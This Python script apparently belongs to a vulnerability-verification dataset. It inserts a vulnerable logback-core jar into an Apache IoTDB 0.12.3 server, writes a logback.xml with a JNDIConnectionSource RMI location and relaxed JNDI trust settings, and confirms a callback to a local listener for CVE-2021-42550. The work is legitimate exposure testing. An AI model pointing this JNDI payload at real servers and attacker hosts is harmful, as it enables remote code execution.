#!/usr/bin/env python3
import argparse
import hashlib
import json
import os
import shutil
import signal
import socket
import subprocess
import threading
import time
import zipfile
from pathlib import Path


SAMPLE_ID = "CVE-2021-42550__apache_iotdb_0_12_3_v1_logback_real_entrypoint"
ROOT = Path("/data/lhq/workspace/ljl-v1-downstream-insertions")
LEGACY_ROOT = Path("/data/lhq/workspace/ljl-strict-redo")
ARCHIVE = LEGACY_ROOT / "historical-scan" / "iotdb-distribution-0.12.3-server-bin.zip"
SOURCE_CASE = "logback/CVE-2021-42550"
SOURCE_V1 = Path("/data/lhq/workspace/ljl-patch-java30-projects/input/logback/CVE-2021-42550/v1")
V1_LOGBACK_CORE = ROOT / "vendor-m2/ch/qos/logback/logback-core/1.2.7/logback-core-1.2.7.jar"
JAVA8 = Path("/data/lhq/.sdkman/candidates/java/8.0.452-amzn")
DIST_NAME = "apache-iotdb-0.12.3-server-bin"
TARGET_CORE_NAME = "logback-core-1.2.3.jar"


def sha256(path):
    digest = hashlib.sha256()
    with Path(path).open("rb") as handle:
        for chunk in iter(lambda: handle.read(1024 * 1024), b""):
            digest.update(chunk)
    return digest.hexdigest()


def inspect_logback_core(jar_path):
    jar_path = Path(jar_path)
    result = {
        "path": str(jar_path),
        "exists": jar_path.exists(),
        "jndi_connection_source_class_present": False,
        "version": None,
    }
    if not jar_path.exists():
        return result
    with zipfile.ZipFile(jar_path) as zf:
        names = set(zf.namelist())
        result["jndi_connection_source_class_present"] = (
            "ch/qos/logback/core/db/JNDIConnectionSource.class" in names
        )
        props = "META-INF/maven/ch.qos.logback/logback-core/pom.properties"
        if props in names:
            for line in zf.read(props).decode("utf-8", "replace").splitlines():
                if line.startswith("version="):
                    result["version"] = line.split("=", 1)[1]
    return result


def ensure_iotdb(sample_dir):
    if not ARCHIVE.exists():
        raise FileNotFoundError(ARCHIVE)
    dist = sample_dir / DIST_NAME
    if dist.exists():
        shutil.rmtree(dist)
    with zipfile.ZipFile(ARCHIVE) as zf:
        zf.extractall(sample_dir)
    for dirname in ("sbin", "tools"):
        script_dir = dist / dirname
        if script_dir.exists():
            for script in script_dir.glob("*"):
                if script.is_file():
                    script.chmod(script.stat().st_mode | 0o111)
    return dist


def insert_v1_logback(dist, evidence_dir):
    if not V1_LOGBACK_CORE.exists():
        raise FileNotFoundError(V1_LOGBACK_CORE)
    target = dist / "lib" / TARGET_CORE_NAME
    if not target.exists():
        raise FileNotFoundError(target)

    before = {
        "target_path": str(target),
        "sha256_before": sha256(target),
        "inspection_before": inspect_logback_core(target),
    }
    shutil.copy2(V1_LOGBACK_CORE, target)
    after = {
        "target_path": str(target),
        "source_v1_runtime_jar": str(V1_LOGBACK_CORE),
        "sha256_source": sha256(V1_LOGBACK_CORE),
        "sha256_target_after": sha256(target),
        "inspection_after": inspect_logback_core(target),
        "target_filename_preserved_for_downstream_classpath": True,
    }
    jars = sorted(str(p.relative_to(dist)) for p in (dist / "lib").glob("logback-*.jar"))
    evidence = {
        "artifact": str(ARCHIVE),
        "source_case": SOURCE_CASE,
        "source_v1": str(SOURCE_V1),
        "insertion_method": (
            "isolated runtime dependency insertion: official Apache IoTDB 0.12.3 server "
            "binary with generated-v1-selected vulnerable logback-core 1.2.7 bytes copied "
            "into the original IoTDB logback-core 1.2.3 runtime filename before invoking "
            "the real sbin/start-server.sh entrypoint"
        ),
        "before_insertion": {TARGET_CORE_NAME: before},
        "inserted_v1_jars": {TARGET_CORE_NAME: after},
        "runtime_logback_jars_after_insertion": jars,
        "logback_classic_retained": "lib/logback-classic-1.2.3.jar",
    }
    (evidence_dir / "dependency-evidence.json").write_text(
        json.dumps(evidence, indent=2, sort_keys=True) + "\n", encoding="utf-8"
    )
    (evidence_dir / "dependency-evidence.txt").write_text("\n".join(jars) + "\n", encoding="utf-8")
    return evidence


def start_rmi_listener(evidence_dir, case_name, timeout=14):
    received = []
    ready = threading.Event()
    port_box = {}

    def worker():
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(("127.0.0.1", 0))
            sock.listen(5)
            sock.settimeout(timeout)
            port_box["port"] = sock.getsockname()[1]
            (evidence_dir / f"{case_name}-rmi-port.txt").write_text(
                str(port_box["port"]) + "\n", encoding="utf-8"
            )
            ready.set()
            try:
                conn, addr = sock.accept()
            except socket.timeout:
                return
            with conn:
                data = conn.recv(256)
                received.append({"addr": repr(addr), "data_hex": data.hex(), "data_repr": repr(data)})

    thread = threading.Thread(target=worker, daemon=True)
    thread.start()
    if not ready.wait(3):
        raise RuntimeError(f"RMI listener did not start for {case_name}")
    return port_box["port"], received, thread


def logback_config(jndi_location):
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<configuration debug="true">\n'
        '  <appender name="DB" class="ch.qos.logback.classic.db.DBAppender">\n'
        '    <connectionSource class="ch.qos.logback.core.db.JNDIConnectionSource">\n'
        f"      <jndiLocation>{jndi_location}</jndiLocation>\n"
        "    </connectionSource>\n"
        "  </appender>\n"
        '  <root level="INFO">\n'
        '    <appender-ref ref="DB"/>\n'
        "  </root>\n"
        "</configuration>\n"
    )


def stop_process(proc):
    if proc.poll() is not None:
        return
    try:
        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
        proc.wait(timeout=5)
    except Exception:
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
            proc.wait(timeout=3)
        except Exception:
            pass


def stop_leftovers(dist):
    subprocess.run(
        ["pkill", "-f", str(dist)],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        text=True,
    )


def exercise_iotdb(dist, evidence_dir, case_name, location_factory):
    port, received, thread = start_rmi_listener(evidence_dir, case_name)
    jndi_location = location_factory(port)
    config = dist / "conf" / "logback.xml"
    config.write_text(logback_config(jndi_location), encoding="utf-8")
    (evidence_dir / f"{case_name}-logback.xml").write_text(
        config.read_text(encoding="utf-8"), encoding="utf-8"
    )

    env = os.environ.copy()
    env["JAVA_TOOL_OPTIONS"] = "-Dcom.sun.jndi.rmi.object.trustURLCodebase=true"
    if JAVA8.exists():
        env["JAVA_HOME"] = str(JAVA8)
        env["PATH"] = str(JAVA8 / "bin") + ":" + env.get("PATH", "")

    started = time.time()
    proc = subprocess.Popen(
        ["bash", "sbin/start-server.sh"],
        cwd=str(dist),
        env=env,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        start_new_session=True,
    )
    timed_out = False
    try:
        output, _ = proc.communicate(timeout=18)
    except subprocess.TimeoutExpired:
        timed_out = True
        stop_process(proc)
        output, _ = proc.communicate(timeout=5)
    thread.join(14)
    stop_leftovers(dist)

    result = {
        "case": case_name,
        "entrypoint": "sbin/start-server.sh",
        "cmd": ["bash", "sbin/start-server.sh"],
        "duration_seconds": round(time.time() - started, 3),
        "jndi_location": jndi_location,
        "listener_received_count": len(received),
        "listener_received": received,
        "returncode": proc.returncode,
        "timed_out": timed_out,
        "java_home": env.get("JAVA_HOME"),
        "stdout_contains_iotdb_entrypoint": "org.apache.iotdb.db.service.IoTDB" in output,
        "stdout_contains_jndi_connection_source": "JNDIConnectionSource" in output,
        "stdout_tail": output[-10000:],
    }
    (evidence_dir / f"{case_name}.json").write_text(
        json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8"
    )
    return result


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--workdir", default=str(ROOT))
    parser.add_argument("--fresh", action="store_true")
    args = parser.parse_args()

    root = Path(args.workdir)
    sample_dir = root / "samples" / SAMPLE_ID
    if args.fresh and sample_dir.exists():
        shutil.rmtree(sample_dir)
    evidence_dir = sample_dir / "evidence"
    evidence_dir.mkdir(parents=True, exist_ok=True)

    dist = ensure_iotdb(sample_dir)
    dependency_evidence = insert_v1_logback(dist, evidence_dir)
    positive = exercise_iotdb(
        dist,
        evidence_dir,
        "positive",
        lambda port: f"rmi://127.0.0.1:{port}/item",
    )
    negative = exercise_iotdb(
        dist,
        evidence_dir,
        "negative",
        lambda port: "java:comp/env/jdbc/item",
    )

    inserted = dependency_evidence["inserted_v1_jars"][TARGET_CORE_NAME]
    confirmed = (
        positive["listener_received_count"] > 0
        and negative["listener_received_count"] == 0
        and positive["stdout_contains_iotdb_entrypoint"]
        and negative["stdout_contains_iotdb_entrypoint"]
        and positive["stdout_contains_jndi_connection_source"]
        and negative["stdout_contains_jndi_connection_source"]
        and inserted["inspection_after"]["version"] == "1.2.7"
        and inserted["inspection_after"]["jndi_connection_source_class_present"]
        and inserted["sha256_source"] == inserted["sha256_target_after"]
    )

    result = {
        "sample_id": SAMPLE_ID,
        "status": "TP_CONFIRMED_REAL_DOWNSTREAM_ENTRYPOINT" if confirmed else "FAILED",
        "strict_status": "TP_CONFIRMED" if confirmed else "FAILED",
        "source_case": SOURCE_CASE,
        "source_v1_path": str(SOURCE_V1),
        "downstream_repo": "apache/iotdb",
        "downstream_application": "Apache IoTDB 0.12.3 server",
        "downstream_entrypoint": "sbin/start-server.sh",
        "downstream": "Apache IoTDB 0.12.3 server",
        "attack_surface": (
            "IoTDB's real server launcher loads conf/logback.xml during startup; "
            "the inserted v1 logback-core resolves JNDIConnectionSource before the service is terminated"
        ),
        "cve": "CVE-2021-42550",
        "upstream_library": "logback",
        "vulnerable_version": "1.2.7",
        "artifact": str(ARCHIVE),
        "dependency_evidence": dependency_evidence,
        "dependency_evidence_file": str(evidence_dir / "dependency-evidence.json"),
        "dynamic_evidence": str(evidence_dir / "probe.json"),
        "run_rc": str(evidence_dir / "run.rc"),
        "verifier": str(root / "scripts" / "verify_iotdb_logback_v1_inserted.py"),
        "payload": positive["jndi_location"],
        "positive": positive,
        "negative": negative,
        "dynamic_signal": {
            "positive_listener_received_count": positive["listener_received_count"],
            "positive_listener_received": positive["listener_received"],
            "negative_listener_received_count": negative["listener_received_count"],
            "negative_listener_received": negative["listener_received"],
        },
        "not_cve_poc_local": True,
        "not_runner_only": True,
        "notes": (
            "The verifier does not execute the v1 App.java harness. It inserts the vulnerable "
            "logback-core 1.2.7 runtime dependency selected by logback/CVE-2021-42550/v1 into "
            "an isolated Apache IoTDB 0.12.3 server distribution, then triggers JNDIConnectionSource "
            "through IoTDB's real sbin/start-server.sh launcher and logback configuration path. "
            "The positive control receives a JRMI connection; the negative java:comp/env control receives none."
        ),
    }

    (sample_dir / "manifest.json").write_text(
        json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8"
    )
    (evidence_dir / "probe.json").write_text(
        json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8"
    )
    listener_hex = ""
    if positive["listener_received"]:
        listener_hex = positive["listener_received"][0].get("data_hex", "")
    (evidence_dir / "run.rc").write_text(
        f"RUN_RC={0 if confirmed else 1}\n"
        f"status={result['strict_status']}\n"
        f"positive_returncode={positive['returncode']}\n"
        f"positive_timed_out={int(positive['timed_out'])}\n"
        f"positive_iotdb_entrypoint_observed={int(positive['stdout_contains_iotdb_entrypoint'])}\n"
        f"positive_jndi_connection_source_observed={int(positive['stdout_contains_jndi_connection_source'])}\n"
        f"positive_listener_received_count={positive['listener_received_count']}\n"
        f"listener_data_hex={listener_hex}\n"
        f"negative_returncode={negative['returncode']}\n"
        f"negative_timed_out={int(negative['timed_out'])}\n"
        f"negative_iotdb_entrypoint_observed={int(negative['stdout_contains_iotdb_entrypoint'])}\n"
        f"negative_jndi_connection_source_observed={int(negative['stdout_contains_jndi_connection_source'])}\n"
        f"negative_listener_received_count={negative['listener_received_count']}\n"
        f"inserted_logback_core_version={inserted['inspection_after']['version']}\n"
        f"jndi_connection_source_class_present={int(inserted['inspection_after']['jndi_connection_source_class_present'])}\n",
        encoding="utf-8",
    )
    (sample_dir / "README.md").write_text(
        f"# {SAMPLE_ID}\n\n"
        "This is a strict insertion sample. The verifier unpacks the official Apache IoTDB 0.12.3 "
        "server binary into an isolated runtime, copies the vulnerable logback-core 1.2.7 bytes "
        "selected by `logback/CVE-2021-42550/v1` into IoTDB's original `logback-core-1.2.3.jar` "
        "classpath filename, and starts the real `sbin/start-server.sh` launcher.\n\n"
        "The positive run writes `conf/logback.xml` with a `JNDIConnectionSource` RMI location and "
        "receives a JRMI connection. The negative run uses the same downstream startup path with "
        "`java:comp/env/jdbc/item` and receives no callback.\n\n"
        "Run: `python3 scripts/verify_iotdb_logback_v1_inserted.py --fresh` from "
        "`/data/lhq/workspace/ljl-v1-downstream-insertions`.\n",
        encoding="utf-8",
    )

    print(json.dumps(result, indent=2, sort_keys=True))
    raise SystemExit(0 if confirmed else 1)


if __name__ == "__main__":
    main()
